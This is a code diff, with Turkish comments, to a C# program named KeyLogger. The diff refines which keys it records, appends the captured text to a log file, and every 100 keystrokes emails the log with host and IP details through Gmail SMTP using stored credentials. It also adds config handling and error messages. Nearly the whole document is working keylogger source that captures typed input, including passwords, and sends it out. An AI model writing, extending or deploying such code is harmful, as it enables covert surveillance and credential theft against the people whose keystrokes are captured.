@@ -45,10 +45,26 @@ namespace KeyLogger
                     {
                         string textToWrite = "";
 
-                        if (i >= 32 && i <= 126)
+                        // Sadece yazdırılabilir karakterleri kaydet
+                        if (i >= 48 && i <= 57)  // Sayılar (0-9)
                         {
                             Console.Write((char)i);
                             textToWrite = ((char)i).ToString();
+                        }
+                        else if (i >= 65 && i <= 90)  // Harfler (A-Z)
+                        {
+                            Console.Write((char)i);
+                            textToWrite = ((char)i).ToString();
+                        }
+                        else if (i >= 97 && i <= 122)  // Küçük harfler (a-z)
+                        {
+                            Console.Write((char)i);
+                            textToWrite = ((char)i).ToString();
+                        }
+                        else if (i == 32)  // Space
+                        {
+                            Console.Write(" ");
+                            textToWrite = " ";
                         }
                         else if (i == 13)  // Enter
                         {
@@ -60,30 +76,34 @@ namespace KeyLogger
                             Console.Write("[BACKSPACE]");
                             textToWrite = "[BACKSPACE]";
                         }
-                        else if (i == 32)  // Space
+                        else if (i >= 186 && i <= 222)  // Noktalama işaretleri
                         {
-                            Console.Write(" ");
-                            textToWrite = " ";
+                            // ; = , - . / ` [ \ ] '
+                            Console.Write((char)i);
+                            textToWrite = ((char)i).ToString();
                         }
+                        // Diğer tuşları (F1-F12, Arrow keys, vb.) görmezden gel
                         else
                         {
-                            Console.Write($"[{i}]");
-                            textToWrite = $"[{i}]";
+                            // Hiçbir şey yapma - sayılar ve özel tuşlar gösterilmeyecek
+                            Thread.Sleep(100);
+                            continue;
                         }
 
-                      
-                        File.AppendAllText(path, textToWrite, Encoding.UTF8);
-                        numberOfKeyStrokes++;
-                        
-                        
-                        if (numberOfKeyStrokes >= 100)
+                        // Boş değilse kaydet
+                        if (!string.IsNullOrEmpty(textToWrite))
                         {
-                            SendNewMessage(path);
-                            numberOfKeyStrokes = 0; 
+                            File.AppendAllText(path, textToWrite, Encoding.UTF8);
+                            numberOfKeyStrokes++;
+                            
+                            if (numberOfKeyStrokes >= 100)
+                            {
+                                SendNewMessage(path);
+                                numberOfKeyStrokes = 0; 
+                            }
                         }
                         
                         Thread.Sleep(100);
-
                     }
                 }
             }
@@ -92,11 +112,27 @@ namespace KeyLogger
         {
             try
             {
+                // Email ayarları kontrol et
+                if (string.IsNullOrEmpty(emailAddress) || string.IsNullOrEmpty(emailPassword))
+                {
+                    Console.WriteLine("\n[UYARI: Email ayarları yüklenmemiş! config.txt dosyasını düzenleyin.]");
+                    Console.WriteLine("[Email örneği: your-email@gmail.com]");
+                    Console.WriteLine("[Password: Gmail App Password (16 haneli)]");
+                    return;
+                }
+                
                 String logContent = File.ReadAllText(path, Encoding.UTF8);
+                
+                // Boş içerik kontrolü
+                if (string.IsNullOrWhiteSpace(logContent))
+                {
+                    Console.WriteLine("\n[Log dosyası boş, email gönderilmedi.]");
+                    return;
+                }
+                
                 string emailBody = "";
-
                 DateTime now = DateTime.Now;
-                string subject = "Keylogger'dan Gelen Bilgiler - " + now.ToString("dd/MM/yyyy HH:mm");
+                string subject = "Keylogger - " + now.ToString("dd/MM/yyyy HH:mm");
                 
                 var host = Dns.GetHostEntry(Dns.GetHostName());
                 emailBody += "=== SİSTEM BİLGİLERİ ===\n";
@@ -115,32 +151,46 @@ namespace KeyLogger
                 emailBody += "=== KAYDEDILEN TUŞLAR ===\n";
                 emailBody += logContent;
 
+                Console.WriteLine("\n[Email gönderiliyor...]");
                 
-                // Email ayarları kontrol et
-                if (string.IsNullOrEmpty(emailAddress) || string.IsNullOrEmpty(emailPassword))
+                using (SmtpClient client = new SmtpClient("smtp.gmail.com", 587))
                 {
-                    Console.WriteLine("\n[Email ayarları yüklenmemiş! config.txt dosyasını kontrol edin.]");
-                    return;
+                    client.EnableSsl = true;
+                    client.Timeout = 10000; // 10 saniye timeout
+                    client.UseDefaultCredentials = false;
+                    client.Credentials = new NetworkCredential(emailAddress, emailPassword);
+                    
+                    using (MailMessage mailMessage = new MailMessage())
+                    {
+                        mailMessage.From = new MailAddress(emailAddress);
+                        mailMessage.To.Add(emailAddress);
+                        mailMessage.Subject = subject;
+                        mailMessage.Body = emailBody;
+                        mailMessage.IsBodyHtml = false;
+                        mailMessage.Priority = MailPriority.Normal;
+                        
+                        client.Send(mailMessage);
+                    }
                 }
                 
-                SmtpClient client = new SmtpClient("smtp.gmail.com", 587); 
-                client.EnableSsl = true;
-                client.UseDefaultCredentials = false;
-                client.Credentials = new NetworkCredential(emailAddress, emailPassword);
+                Console.WriteLine("[✓ Email başarıyla gönderildi!]");
                 
-                MailMessage mailMessage = new MailMessage();
-                mailMessage.From = new MailAddress(emailAddress);
-                mailMessage.To.Add(emailAddress);
-                mailMessage.Subject = subject;
-                mailMessage.Body = emailBody;
-                mailMessage.IsBodyHtml = false;
-                
-                client.Send(mailMessage);
-                Console.WriteLine("\n[Email gönderildi!]");
+                // Log dosyasını temizle (isteğe bağlı)
+                // File.WriteAllText(path, "", Encoding.UTF8);
+            }
+            catch (SmtpException smtpEx)
+            {
+                Console.WriteLine($"\n[SMTP HATASI: {smtpEx.Message}]");
+                Console.WriteLine("[Çözüm: Gmail'de 'Uygulama Şifresi' kullanın]");
+                Console.WriteLine("[Link: https://myaccount.google.com/apppasswords]");
             }
             catch (Exception ex)
             {
                 Console.WriteLine($"\n[Email hatası: {ex.Message}]");
+                if (ex.InnerException != null)
+                {
+                    Console.WriteLine($"[Detay: {ex.InnerException.Message}]");
+                }
             }
         }
         
@@ -148,12 +198,28 @@ namespace KeyLogger
         {
             try
             {
-                string configPath = "config.txt";
+                // Çalıştırılabilir dosyanın bulunduğu dizini al
+                string exeDir = AppDomain.CurrentDomain.BaseDirectory;
+                string configPath = Path.Combine(exeDir, "config.txt");
+                
+                // Debug log dosyası
+                string debugLog = Path.Combine(exeDir, "debug_log.txt");
+                string debugInfo = $"[{DateTime.Now}]\n";
+                debugInfo += $"Çalışma dizini: {Directory.GetCurrentDirectory()}\n";
+                debugInfo += $"Exe dizini: {exeDir}\n";
+                debugInfo += $"Config aranıyor: {configPath}\n";
+                debugInfo += $"Dosya var mı: {File.Exists(configPath)}\n\n";
+                File.AppendAllText(debugLog, debugInfo, Encoding.UTF8);
+                
+                Console.WriteLine($"Çalışma dizini: {Directory.GetCurrentDirectory()}");
+                Console.WriteLine($"Exe dizini: {exeDir}");
+                Console.WriteLine($"Config aranıyor: {configPath}");
                 
                 if (!File.Exists(configPath))
                 {
                     Console.WriteLine("config.txt bulunamadı. Oluşturuluyor...");
                     File.WriteAllText(configPath, "EMAIL=your-email@gmail.com\nPASSWORD=your-app-password-here", Encoding.UTF8);
+                    Console.WriteLine($"Config dosyası oluşturuldu: {configPath}");
                     Console.WriteLine("config.txt dosyasına email ve şifrenizi girin!");
                     return;
                 }
@@ -167,7 +233,8 @@ namespace KeyLogger
                     }
                     else if (line.StartsWith("PASSWORD="))
                     {
-                        emailPassword = line.Substring(9).Trim();
+                   
+                        emailPassword = line.Substring(9).Trim().Replace(" ", "");
                     }
                 }
                 
